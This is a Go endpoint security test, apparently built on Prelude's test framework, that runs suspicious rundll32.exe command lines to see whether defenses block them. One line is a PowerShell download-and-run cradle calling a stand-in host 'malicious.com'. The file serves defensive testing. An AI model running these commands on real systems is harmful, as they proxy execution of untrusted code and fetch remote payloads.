//go:build windows
// +build windows

/*
ID: cfaf983e-1129-464c-b0aa-270f42e20d3d
NAME: RunDLL32 with Unusual Arguments
CREATED: 2024-06-
scenario: abusing rundll32.exe to proxy execution of malicious code
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting RunDLL32 with Unusual Arguments VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	commands := []string{
		// Suspicious extensions and paths
		"rundll32.exe C:\\Users\\Public\\image.jpg,Open",
		"rundll32.exe C:\\Users\\Public\\document.png,Open",
		"rundll32.exe C:\\Users\\Public\\file.tmp,Open",
		"rundll32.exe C:\\Users\\Public\\data.dat,Open",
		// Execution from temp with suspicious parent process tree
		"rundll32.exe C:\\Users\\Public\\AppData\\Local\\Temp\\malicious.dll,Open",
		// Fake Control_RunDLL export
		"rundll32.exe Control_RunDLL malware.dll",
		// Delayed execution
		"cmd.exe /c timeout /t 5 && rundll32.exe malware.dll,Open",
		// Suspicious parent powershell args
		"powershell.exe -enc IEX;New-Object Net.WebClient;($client=new-object System.Net.WebClient).DownloadString('http://malicious.com');rundll32.exe malware.dll,Open",
	}

	for _, command := range commands {
		// Check if we can execute the command (simulate a protection mechanism)
		if !Endpoint.IsAvailable("rundll32.exe") {
			Endpoint.Say("[+] Command execution is not available")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}

		// Execute the command
		out, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to execute command: %s", string(out)))
			Endpoint.Stop(1) // ERROR
		}

		Endpoint.Say(fmt.Sprintf("[+] Successfully executed command: %s", command))

		// Check if the process was blocked (simulate a protection mechanism)
		if strings.Contains(string(out), "Access Denied") {
			Endpoint.Say("[+] Process execution was blocked")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}
	}

	Endpoint.Stop(101) // UNPROTECTED
}

func cleanup() {
	// Clean up any created services and other artifacts
	commands := []string{
		"taskkill /IM rundll32.exe /F",
	}

	for _, command := range commands {
		exec.Command("cmd.exe", "/C", command).Run()
	}

	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
